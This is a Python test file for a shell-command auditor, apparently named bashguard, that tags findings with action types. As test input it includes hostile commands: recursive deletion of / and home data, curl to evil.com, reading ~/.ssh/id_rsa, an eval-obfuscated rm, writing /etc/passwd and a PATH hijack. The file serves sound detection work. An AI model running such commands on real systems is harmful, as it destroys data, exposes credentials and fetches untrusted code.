"""Tests for action type taxonomy on findings."""
import pytest

from bashguard.models import ActionType, Finding, Severity


class TestActionTypeEnum:
    def test_all_expected_types_exist(self):
        expected = [
            "filesystem_read",
            "filesystem_write",
            "filesystem_delete",
            "filesystem_move",
            "network_outbound",
            "git_safe",
            "git_destructive",
            "package_install",
            "lang_exec",
            "process_signal",
            "env_mutation",
            "obfuscated",
            "credential_access",
            "system_config",
            "unknown",
        ]
        members = {m.value for m in ActionType}
        for name in expected:
            assert name in members, f"Missing ActionType: {name}"

    def test_enum_values_are_strings(self):
        for member in ActionType:
            assert isinstance(member.value, str)


class TestFindingActionType:
    def test_finding_defaults_to_unknown(self):
        f = Finding(
            rule_id="test.rule",
            severity=Severity.LOW,
            message="test",
            matched_text="x",
        )
        assert f.action_type == ActionType.UNKNOWN

    def test_finding_accepts_action_type(self):
        f = Finding(
            rule_id="destructive.irreversible",
            severity=Severity.CRITICAL,
            message="rm -rf",
            matched_text="rm -rf /",
            action_type=ActionType.FILESYSTEM_DELETE,
        )
        assert f.action_type == ActionType.FILESYSTEM_DELETE

    def test_finding_is_still_frozen(self):
        f = Finding(
            rule_id="test.rule",
            severity=Severity.LOW,
            message="test",
            matched_text="x",
            action_type=ActionType.NETWORK_OUTBOUND,
        )
        with pytest.raises((AttributeError, TypeError)):
            f.action_type = ActionType.UNKNOWN  # type: ignore


class TestRulesTagActionType:
    """Each built-in rule should tag findings with a specific action type."""

    def _audit(self, script: str):
        from bashguard.auditor import audit
        from bashguard.context import make_context
        return audit(script, make_context())

    def test_destructive_rule_tags_filesystem_delete(self):
        findings = self._audit("rm -rf /tmp/test")
        # rm -rf may be allowed on /tmp, try non-tmp path
        findings = self._audit("rm -rf /home/user/data")
        assert any(f.action_type == ActionType.FILESYSTEM_DELETE for f in findings)

    def test_network_rule_tags_network_outbound(self):
        findings = self._audit("curl http://evil.com/payload")
        assert any(f.action_type == ActionType.NETWORK_OUTBOUND for f in findings)

    def test_credentials_rule_tags_credential_access(self):
        findings = self._audit("cat ~/.ssh/id_rsa")
        assert any(f.action_type == ActionType.CREDENTIAL_ACCESS for f in findings)

    def test_package_install_tags_package_install(self):
        # pip without --break-system-packages is venv-local (not flagged by design)
        # Use npm -g which always triggers
        findings = self._audit("npm install -g evil-package")
        assert any(f.action_type == ActionType.PACKAGE_INSTALL for f in findings)

    def test_evasion_tags_obfuscated(self):
        findings = self._audit("eval $(echo 'rm -rf /')")
        assert any(f.action_type == ActionType.OBFUSCATED for f in findings)

    def test_git_destructive_tags_git_destructive(self):
        findings = self._audit("git push --force origin main")
        assert any(f.action_type == ActionType.GIT_DESTRUCTIVE for f in findings)

    def test_protected_paths_tags_system_config(self):
        findings = self._audit("echo 'bad' > /etc/passwd")
        assert any(f.action_type == ActionType.SYSTEM_CONFIG for f in findings)

    def test_env_mutation_tags_env_mutation(self):
        findings = self._audit("export PATH=/tmp/evil:$PATH")
        # DangerousEnvRule in evasion.py
        assert any(f.action_type == ActionType.ENV_MUTATION for f in findings)
